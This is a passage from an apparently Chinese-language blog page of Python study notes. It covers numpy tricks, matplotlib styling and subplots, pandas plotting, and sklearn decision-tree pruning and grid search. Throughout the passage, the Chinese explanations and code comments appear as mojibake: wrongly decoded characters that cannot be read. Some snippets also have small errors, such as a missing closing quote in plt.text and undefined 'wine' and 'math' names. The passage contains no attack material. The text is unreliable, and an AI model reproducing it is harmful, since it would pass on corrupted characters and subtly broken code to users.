åçš„åˆ—</strong>ã€‚</p><p>è¿™é‡Œä¸¾ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šå°å‡åˆè€ƒè¯•ï¼Œé‡ç‚¹ç­å½•å–å­¦ç”ŸæŒ‰ç…§æ€»æˆç»©å½•å–ã€‚åœ¨æ€»æˆç»©ç›¸åŒæ—¶ï¼Œæ•°å­¦æˆç»©é«˜çš„ä¼˜å…ˆå½•å–ï¼Œåœ¨æ€»æˆç»©å’Œæ•°å­¦æˆç»©éƒ½ç›¸åŒæ—¶ï¼ŒæŒ‰ç…§è‹±è¯­æˆç»©å½•å–â€¦â€¦ è¿™é‡Œï¼Œæ€»æˆç»©æ’åœ¨ç”µå­è¡¨æ ¼çš„æœ€åä¸€åˆ—ï¼Œæ•°å­¦æˆç»©åœ¨å€’æ•°ç¬¬äºŒåˆ—ï¼Œè‹±è¯­æˆç»©åœ¨å€’æ•°ç¬¬ä¸‰åˆ—ã€‚</p><h3><span id="ç»ƒä¹ é¢˜">ç»ƒä¹ é¢˜</span></h3><h2><span id="trick">Trick</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># æ˜¾ç¤ºå¸®åŠ©</span></span><br><span class="line">np.add?? <span class="comment"># æ˜¾ç¤ºæºä»£ç </span></span><br><span class="line"><span class="comment"># fstingç”¨æ³• python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="matplotlib">Matplotlib</span></h2><ul><li><code>%matplotlib inline</code>: è¿™ä¸€å¥æ˜¯IPythonçš„é­”æ³•å‡½æ•°ï¼Œå¯ä»¥åœ¨IPythonç¼–è¯‘å™¨é‡Œç›´æ¥ä½¿ç”¨ï¼Œä½œç”¨æ˜¯å†…åµŒç”»å›¾ï¼Œçœç•¥æ‰plt.show()è¿™ä¸€æ­¥ï¼Œç›´æ¥æ˜¾ç¤ºå›¾åƒã€‚</li></ul><h3><span id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</span></h3><ul><li><p>ç”»å›¾</p><p><code>plt.plot(x,y)</code></p></li><li><p>æ ‡ç­¾</p><p><code>plt.xlabel(&#39;xlabel&#39;,fontsize = 16)</code></p></li><li><p>çº¿æ¡&amp;é¢œè‰²</p><table><thead><tr><th align="right">å­—ç¬¦</th><th align="right">ç±»å‹</th><th align="right">å­—ç¬¦</th><th align="right">ç±»å‹</th></tr></thead><tbody><tr><td align="right"><code>&#39;-&#39;</code></td><td align="right">å®çº¿</td><td align="right"><code>&#39;--&#39;</code></td><td align="right">è™šçº¿</td></tr><tr><td align="right"><code>&#39;-.&#39;</code></td><td align="right">è™šç‚¹çº¿</td><td align="right"><code>&#39;:&#39;</code></td><td align="right">ç‚¹çº¿</td></tr><tr><td align="right"><code>&#39;.&#39;</code></td><td align="right">ç‚¹</td><td align="right"><code>&#39;,&#39;</code></td><td align="right">åƒç´ ç‚¹</td></tr><tr><td align="right"><code>&#39;o&#39;</code></td><td align="right">åœ†ç‚¹</td><td align="right"><code>&#39;v&#39;</code></td><td align="right">ä¸‹ä¸‰è§’ç‚¹</td></tr><tr><td align="right"><code>&#39;^&#39;</code></td><td align="right">ä¸Šä¸‰è§’ç‚¹</td><td align="right"><code>&#39;&lt;&#39;</code></td><td align="right">å·¦ä¸‰è§’ç‚¹</td></tr><tr><td align="right"><code>&#39;&gt;&#39;</code></td><td align="right">å³ä¸‰è§’ç‚¹</td><td align="right"><code>&#39;1&#39;</code></td><td align="right">ä¸‹ä¸‰å‰ç‚¹</td></tr><tr><td align="right"><code>&#39;2&#39;</code></td><td align="right">ä¸Šä¸‰å‰ç‚¹</td><td align="right"><code>&#39;3&#39;</code></td><td align="right">å·¦ä¸‰å‰ç‚¹</td></tr><tr><td align="right"><code>&#39;4&#39;</code></td><td align="right">å³ä¸‰å‰ç‚¹</td><td align="right"><code>&#39;s&#39;</code></td><td align="right">æ­£æ–¹ç‚¹</td></tr><tr><td align="right"><code>&#39;p&#39;</code></td><td align="right">äº”è§’ç‚¹</td><td align="right"><code>&#39;*&#39;</code></td><td align="right">æ˜Ÿå½¢ç‚¹</td></tr><tr><td align="right"><code>&#39;h&#39;</code></td><td align="right">å…­è¾¹å½¢ç‚¹1</td><td align="right"><code>&#39;H&#39;</code></td><td align="right">å…­è¾¹å½¢ç‚¹2</td></tr><tr><td align="right"><code>&#39;+&#39;</code></td><td align="right">åŠ å·ç‚¹</td><td align="right"><code>&#39;x&#39;</code></td><td align="right">ä¹˜å·ç‚¹</td></tr><tr><td align="right"><code>&#39;D&#39;</code></td><td align="right">å®å¿ƒè±å½¢ç‚¹</td><td align="right"><code>&#39;d&#39;</code></td><td align="right">ç˜¦è±å½¢ç‚¹</td></tr><tr><td align="right"><code>&#39;_&#39;</code></td><td align="right">æ¨ªçº¿ç‚¹</td><td align="right"></td><td align="right"></td></tr></tbody></table><table><thead><tr><th align="right">å­—ç¬¦</th><th align="right">é¢œè‰²</th></tr></thead><tbody><tr><td align="right"><code>â€˜bâ€™</code></td><td align="right">è“è‰²ï¼Œblue</td></tr><tr><td align="right"><code>â€˜gâ€™</code></td><td align="right">ç»¿è‰²ï¼Œgreen</td></tr><tr><td align="right"><code>â€˜râ€™</code></td><td align="right">çº¢è‰²ï¼Œred</td></tr><tr><td align="right"><code>â€˜câ€™</code></td><td align="right">é’è‰²ï¼Œcyan</td></tr><tr><td align="right"><code>â€˜mâ€™</code></td><td align="right">å“çº¢ï¼Œmagenta</td></tr><tr><td align="right"><code>â€˜yâ€™</code></td><td align="right">é»„è‰²ï¼Œyellow</td></tr><tr><td align="right"><code>â€˜kâ€™</code></td><td align="right">é»‘è‰²ï¼Œblack</td></tr><tr><td align="right"><code>â€˜wâ€™</code></td><td align="right">ç™½è‰²ï¼Œwhite</td></tr></tbody></table></li><li><p>çº¿æ¡é£æ ¼ï¼š</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;-.&#39;,color=&#39;r&#39;)</code></p><p>æˆ–è€…å°†ä¸¤è€…ç»“åˆä½¿ç”¨</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;ro&#39;)</code></p></li><li><p>çº¿å®½ linewidth</p><p><code>plt.plot(x,y,linewidth = 3.0)</code></p></li><li><p>å­å›¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 211 è¡¨ç¤ºä¸€ä¼šè¦ç”»çš„å›¾æ˜¯2è¡Œä¸€åˆ—çš„ æœ€åä¸€ä¸ª1è¡¨ç¤ºçš„æ˜¯å­å›¾å½“ä¸­çš„ç¬¬1ä¸ªå›¾</span></span><br><span class="line">plt.subplot(<span class="number">211</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 212 è¡¨ç¤ºä¸€ä¼šè¦ç”»çš„å›¾æ˜¯2è¡Œä¸€åˆ—çš„ æœ€åä¸€ä¸ª1è¡¨ç¤ºçš„æ˜¯å­å›¾å½“ä¸­çš„ç¬¬2ä¸ªå›¾</span></span><br><span class="line">plt.subplot(<span class="number">212</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>æ ‡é¢˜</p><p><code>plt.title(&#39;title&#39;)</code></p></li><li><p>æ–‡æœ¬</p><p><code>plt.text(x,y,&#39;text)</code></p><p>x,yä¸ºæ•°è½´ä¸Šçš„åæ ‡</p></li><li><p>ç½‘æ ¼</p><p><code>plt.grid(True)</code></p></li><li><p>æ³¨é‡Š</p><p><code>plt.annotate(&#39;tangyudi&#39;,xy=(-5,0),xytext=(-2,0.3),arrowprops = dict(facecolor=&#39;red&#39;,shrink=0.05,headlength= 20,headwidth = 20))</code></p></li></ul><h3><span id="é£æ ¼">é£æ ¼</span></h3><ul><li><p>æŸ¥çœ‹é£æ ¼ï¼š</p><p><code>plt.style.available</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;dark_background&#x27;,</span><br><span class="line"> &#x27;seaborn-talk&#x27;,</span><br><span class="line"> &#x27;seaborn-bright&#x27;,</span><br><span class="line"> &#x27;seaborn-ticks&#x27;,</span><br><span class="line"> &#x27;bmh&#x27;,</span><br><span class="line"> &#x27;ggplot&#x27;,</span><br><span class="line"> &#x27;seaborn-darkgrid&#x27;,</span><br><span class="line"> &#x27;classic&#x27;,</span><br><span class="line"> &#x27;fivethirtyeight&#x27;,</span><br><span class="line"> &#x27;seaborn-deep&#x27;,</span><br><span class="line"> &#x27;seaborn-colorblind&#x27;,</span><br><span class="line"> &#x27;seaborn-muted&#x27;,</span><br><span class="line"> &#x27;seaborn-pastel&#x27;,</span><br><span class="line"> &#x27;seaborn-notebook&#x27;,</span><br><span class="line"> &#x27;seaborn-paper&#x27;,</span><br><span class="line"> &#x27;seaborn-dark-palette&#x27;,</span><br><span class="line"> &#x27;seaborn-whitegrid&#x27;,</span><br><span class="line"> &#x27;seaborn-white&#x27;,</span><br><span class="line"> &#x27;grayscale&#x27;,</span><br><span class="line"> &#x27;seaborn-dark&#x27;,</span><br><span class="line"> &#x27;seaborn-poster&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨é£æ ¼<br><code>plt.style.use(&#39;ggplot&#39;)</code></p><p>Parameters</p><ul><li><p>styleï¼šstr, dict, Path or list</p><p>A style specification. Valid options are:</p><ul><li><p>str: The name of a style or a path&#x2F;URL to a style file. For a list of available style names, see <a href="https://matplotlib.org/stable/api/style_api.html?highlight=style#matplotlib.style.matplotlib.style.available"><code>style.available</code></a>.</p></li><li><p>dict: Dictionary with valid key&#x2F;value pairs for <a href="https://matplotlib.org/stable/api/matplotlib_configuration_api.html#matplotlib.rcParams"><code>matplotlib.rcParams</code></a>.</p></li><li><p>Path: A path-like object which is a path to a style file.</p></li><li><p>list: A list of style specifiers (str, Path or dict) applied from first to last in the list.</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.linspace(-<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="é¢å‘å¯¹è±¡ç”»å›¾">é¢å‘å¯¹è±¡ç”»å›¾</span></h3><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line"><span class="comment">#åˆ›å»ºå›¾å½¢å¯¹è±¡</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line"><span class="comment">#æˆ‘ä»¬ä½¿ç”¨ add_axes() å°† axes è½´åŸŸæ·»åŠ åˆ°ç”»å¸ƒä¸­</span></span><br><span class="line"><span class="comment">#add_axes() çš„å‚æ•°å€¼æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œåºåˆ—ä¸­çš„ 4 ä¸ªæ•°å­—åˆ†åˆ«å¯¹åº”å›¾å½¢çš„å·¦ä¾§å¼€å§‹ç”»å›¾ä½ç½®ï¼Œåº•éƒ¨å¼€å§‹ç”»å›¾ä½ç½®ï¼Œå®½åº¦ç¼©æ”¾ï¼Œå’Œé«˜åº¦ç¼©æ”¾ï¼Œä¸”æ¯ä¸ªæ•°å­—å¿…é¡»ä»‹äº 0 åˆ° 1 ä¹‹é—´ã€‚</span></span><br><span class="line">ax=fig.add_axes([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">&quot;sine wave&quot;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;angle&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;sine&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></code></pre><ul><li>å›¾ä¾‹</li></ul><p>axes ç±»çš„ legend() æ–¹æ³•è´Ÿè´£ç»˜åˆ¶ç”»å¸ƒä¸­çš„å›¾ä¾‹ï¼Œå®ƒéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>ax.legend(handles, labels, loc)</p><ul><li>labels æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åºåˆ—ï¼Œç”¨æ¥æŒ‡å®šæ ‡ç­¾çš„åç§°ï¼›</li><li>loc æ˜¯æŒ‡å®šå›¾ä¾‹ä½ç½®çš„å‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨å­—ç¬¦ä¸²æˆ–æ•´æ•°æ¥è¡¨ç¤ºï¼›</li><li>handles å‚æ•°ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåºåˆ—ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰çº¿å‹çš„å®ä¾‹ï¼›</li></ul><p><a href="http://c.biancheng.net/matplotlib/">http://c.biancheng.net/matplotlib/</a></p><p><img src="https://pic3.zhimg.com/v2-cfe3dd3becbae38d3af4659b4ff1676a_r.jpg" alt="preview"></p><p><a href="https://zhuanlan.zhihu.com/p/139052035">https://zhuanlan.zhihu.com/p/139052035</a></p><p><img src="https://pic3.zhimg.com/80/v2-6e4429872eeb8a155433c0ee7c75b6ea_1440w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-124378df90b3ff1e24eb48c36af08dc9_1440w.jpg" alt="img"></p><p><a href="https://zhuanlan.zhihu.com/p/93423829">https://zhuanlan.zhihu.com/p/93423829</a></p><h2><span id="ç»“åˆpandasç”»å›¾">ç»“åˆpandasç”»å›¾</span></h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">df=pandas.<span class="title function_ invoke__">DataFrame</span>()</span><br><span class="line">å¸¸è§çš„ç”»å›¾æ–¹æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">df.<span class="title function_ invoke__">plot</span>()</span><br><span class="line">ä¹Ÿå¯ä»¥ä¼ å…¥å‚æ•°ï¼šdf.<span class="title function_ invoke__">plot</span>(kind=value)å†³å®šç”»ä»€ä¹ˆç±»å‹çš„å›¾</span><br><span class="line">kind=line    ç”»æŠ˜çº¿å›¾</span><br><span class="line">kind=bar     xè½´ç”»çŸ©å½¢å›¾</span><br><span class="line">kind=barh    yè½´ç”»çŸ©å½¢å›¾</span><br><span class="line">kind=pie     ç”»é¥¼å›¾</span><br><span class="line">kind=scatter ç”»æ•£ç‚¹</span><br><span class="line">kind=<span class="keyword">box</span>     ç”»ç›’å­å›¾</span><br><span class="line">kind=kde     ç”»æ ¸å¯†åº¦ä¼°è®¡å›¾</span><br><span class="line"></span><br><span class="line">æˆ–è€…:</span><br><span class="line">df.plot.<span class="title function_ invoke__">line</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">bar</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">barh</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">pie</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">scatter</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">box</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">kde</span>()</span><br></pre></td></tr></table></figure><h2><span id="sklearn">sklearn</span></h2><h3><span id="å†³ç­–æ ‘">å†³ç­–æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> graphviz</span><br><span class="line"><span class="comment"># pandasæ‹¼æ¥æ•°æ®</span></span><br><span class="line">df = pd.concat([pd.DataFrame(wine.data), pd.DataFrame(wine.target)],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># åˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data, wine.target, test_size=<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># å®ä¾‹åŒ–ä¸€ä¸ªåˆ†ç±»å™¨</span></span><br><span class="line">clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">3</span>,splitter=<span class="string">&quot;random&quot;</span>)</span><br><span class="line"><span class="comment"># è®­ç»ƒ</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># è¯„ä»·ç»“æœ</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨graphvizç”»å‡ºå†³ç­–æ ‘</span></span><br><span class="line">dot_data = tree.export_graphviz(clf, feature_names=wine.feature_names, class_names=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>], filled=<span class="literal">True</span>, rounded=<span class="literal">True</span>, special_characters=<span class="literal">True</span>)</span><br><span class="line">graph = graphviz.Source(dot_data)</span><br><span class="line">graph</span><br><span class="line"><span class="comment"># ç¡®å®šæœ€ä¼˜å‰ªæå‚æ•°</span></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">30</span>,</span><br><span class="line">                                      splitter=<span class="string">&quot;random&quot;</span>,</span><br><span class="line">                                     max_depth=i+<span class="number">1</span>,</span><br><span class="line">                                     )</span><br><span class="line">    clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line">    score = clf.score(Xtest, Ytest)</span><br><span class="line">    test.append(score)</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>), test, color=<span class="string">&#x27;red&#x27;</span>, label=<span class="string">&#x27;max_depth&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç½‘æ ¼æœç´¢ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬åŒæ—¶è°ƒæ•´å¤šä¸ªå‚æ•°ï¼Œé‡‡ç”¨æšä¸¾æ³•</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">entropy_thresholds = np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">50</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>ç‰¹å¾é‡è¦æ€§</li></ul><p><code>clf.feature_importances_</code></p><p><code>[*zip(feature_name,clf.feature_importances_)]</code></p><ul><li>Criterionè¿™ä¸ªå‚æ•°æ­£æ˜¯ç”¨æ¥å†³å®šä¸çº¯åº¦çš„è®¡ç®—æ–¹æ³•çš„ã€‚sklearnæä¾›äº†ä¸¤ç§é€‰æ‹©ï¼š</li></ul><p>1ï¼‰è¾“å…¥â€entropyâ€œï¼Œä½¿ç”¨<strong>ä¿¡æ¯ç†µ</strong>ï¼ˆEntropyï¼‰ </p><p>2ï¼‰è¾“å…¥â€giniâ€œï¼Œä½¿ç”¨<strong>åŸºå°¼ç³»æ•°</strong>ï¼ˆGini Impurityï¼‰</p><blockquote><p>é€šå¸¸å°±ä½¿ç”¨åŸºå°¼ç³»æ•°</p><p>æ•°æ®ç»´åº¦å¾ˆå¤§ï¼Œå™ªéŸ³å¾ˆå¤§æ—¶ä½¿ç”¨åŸºå°¼ç³»æ•°</p><p>ç»´åº¦ä½ï¼Œæ•°æ®æ¯”è¾ƒæ¸…æ™°çš„æ—¶å€™ï¼Œä¿¡æ¯ç†µå’ŒåŸºå°¼ç³»æ•°æ²¡åŒºåˆ«</p><p>å½“å†³ç­–æ ‘çš„æ‹Ÿåˆç¨‹åº¦ä¸å¤Ÿçš„æ—¶å€™ï¼Œä½¿ç”¨ä¿¡æ¯ç†µ</p><p>ä¸¤ä¸ªéƒ½è¯•è¯•ï¼Œä¸å¥½å°±æ¢å¦å¤–ä¸€ä¸ª</p></blockquote><ul><li><strong>random_state &amp; splitter</strong></li></ul><p>  random_stateç”¨æ¥è®¾ç½®åˆ†æä¸­çš„éšæœºæ¨¡å¼çš„å‚æ•°ï¼Œé»˜è®¤Noneï¼Œåœ¨é«˜ç»´åº¦æ—¶éšæœºæ€§ä¼šè¡¨ç°æ›´æ˜æ˜¾ï¼Œä½ç»´åº¦çš„æ•°æ®ï¼ˆæ¯”å¦‚é¸¢å°¾èŠ±æ•°æ®é›†ï¼‰ï¼Œéšæœºæ€§å‡ ä¹ä¸ä¼šæ˜¾ç°ã€‚è¾“å…¥ä»»æ„æ•´æ•°ï¼Œä¼šä¸€ç›´é•¿å‡ºåŒä¸€æ£µæ ‘ï¼Œè®©æ¨¡å‹ç¨³å®šä¸‹æ¥ã€‚</p><p>  splitterä¹Ÿæ˜¯ç”¨æ¥æ§åˆ¶å†³ç­–æ ‘ä¸­çš„éšæœºé€‰é¡¹çš„ï¼Œæœ‰ä¸¤ç§è¾“å…¥å€¼ï¼Œè¾“å…¥â€bestâ€ï¼Œå†³ç­–æ ‘åœ¨åˆ†ææ—¶è™½ç„¶éšæœºï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šä¼˜å…ˆé€‰æ‹©æ›´é‡è¦çš„ç‰¹å¾è¿›è¡Œåˆ†æï¼ˆé‡è¦æ€§å¯ä»¥é€šè¿‡å±æ€§feature_importances_æŸ¥çœ‹ï¼‰ï¼Œè¾“å…¥â€œrandomâ€ï¼Œå†³ç­–æ ‘åœ¨åˆ†ææ—¶ä¼šæ›´åŠ éšæœºï¼Œæ ‘ä¼šå› ä¸ºå«æœ‰æ›´å¤šçš„ä¸å¿…è¦ä¿¡æ¯è€Œæ›´æ·±æ›´å¤§ï¼Œå¹¶å› è¿™äº›ä¸å¿…è¦ä¿¡æ¯è€Œé™ä½å¯¹è®­ç»ƒé›†çš„æ‹Ÿåˆã€‚è¿™ä¹Ÿæ˜¯é˜²æ­¢è¿‡æ‹Ÿåˆçš„ä¸€ç§æ–¹å¼ã€‚å½“ä½ é¢„æµ‹åˆ°ä½ çš„æ¨¡å‹ä¼šè¿‡æ‹Ÿåˆï¼Œç”¨è¿™ä¸¤ä¸ªå‚æ•°æ¥å¸®åŠ©ä½ é™ä½æ ‘å»ºæˆä¹‹åè¿‡æ‹Ÿåˆçš„å¯èƒ½æ€§ã€‚å½“ç„¶ï¼Œæ ‘ä¸€æ—¦å»ºæˆï¼Œæˆ‘ä»¬ä¾ç„¶æ˜¯ä½¿ç”¨å‰ªæå‚æ•°æ¥é˜²æ­¢è¿‡æ‹Ÿåˆ</p><h4><span id="å‰ªæç­–ç•¥">å‰ªæç­–ç•¥</span></h4><ul><li><strong>max_depth</strong></li></ul><p>â€‹  é™åˆ¶æ ‘çš„æœ€å¤§æ·±åº¦ï¼Œè¶…è¿‡è®¾å®šæ·±åº¦çš„æ ‘æå…¨éƒ¨å‰ªæ‰</p><ul><li><p><strong>min_samples_leaf &amp; min_samples_split</strong></p><p>min_samples_leafé™å®šï¼Œä¸€ä¸ªèŠ‚ç‚¹åœ¨åˆ†æåçš„æ¯ä¸ªå­èŠ‚ç‚¹éƒ½å¿…é¡»åŒ…å«è‡³å°‘min_samples_leafä¸ªè®­ç»ƒæ ·æœ¬ï¼Œå¦åˆ™åˆ†æå°±ä¸ä¼šå‘ç”Ÿï¼Œæˆ–è€…ï¼Œåˆ†æä¼šæœç€æ»¡è¶³æ¯ä¸ªå­èŠ‚ç‚¹éƒ½åŒ…å«min_samples_leafä¸ªæ ·æœ¬çš„æ–¹å‘å»å‘ç”Ÿã€‚ä¸€èˆ¬æ­é…max_depthä½¿ç”¨ï¼Œåœ¨å›å½’æ ‘ä¸­æœ‰ç¥å¥‡çš„æ•ˆæœï¼Œå¯ä»¥è®©æ¨¡å‹å˜å¾—æ›´åŠ å¹³æ»‘ã€‚è¿™ä¸ªå‚æ•°çš„æ•°é‡è®¾ç½®å¾—å¤ªå°ä¼šå¼•èµ·è¿‡æ‹Ÿåˆï¼Œè®¾ç½®å¾—å¤ªå¤§å°±ä¼šé˜»æ­¢æ¨¡å‹å­¦ä¹ æ•°æ®ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå»ºè®®ä»&#x3D;5å¼€å§‹ä½¿ç”¨ã€‚å¦‚æœå¶èŠ‚ç‚¹ä¸­å«æœ‰çš„æ 